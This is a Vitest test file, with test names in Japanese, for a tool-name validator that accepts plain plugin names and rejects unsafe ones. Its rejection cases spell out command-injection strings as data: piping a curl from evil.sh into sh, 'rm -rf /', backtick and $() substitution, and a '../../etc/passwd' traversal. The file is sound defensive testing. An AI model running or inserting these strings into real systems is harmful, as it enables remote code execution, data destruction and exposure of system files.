import { describe, expect, it } from 'vitest';
import { assertSafeToolName, isSafeToolName } from './name';

describe('isSafeToolName', () => {
  it('通常のプラグイン名を許可する', () => {
    for (const n of ['read_file', 'csv_to_markdown', 'grep', 'a', 'Tool-1', 'x_2_y']) {
      expect(isSafeToolName(n), n).toBe(true);
    }
  });

  it('シェルメタ文字・空白・パス区切りを含む名前を拒否する', () => {
    const attacks = [
      'x && curl evil.sh | sh',
      'x; rm -rf /',
      'x`whoami`',
      'x$(id)',
      '../../etc/passwd',
      'x y',
      'x"y',
      "x'y",
      'x\ny',
      '',
      'a'.repeat(65),
    ];
    for (const n of attacks) {
      expect(isSafeToolName(n), n).toBe(false);
    }
  });

  it('文字列以外は拒否する', () => {
    for (const v of [null, undefined, 42, {}, ['x']]) {
      expect(isSafeToolName(v)).toBe(false);
    }
  });

  it('assertSafeToolName は不正名で例外を投げる', () => {
    expect(() => assertSafeToolName('ok_name')).not.toThrow();
    expect(() => assertSafeToolName('x && curl evil.sh | sh')).toThrow(/不正/);
  });
});
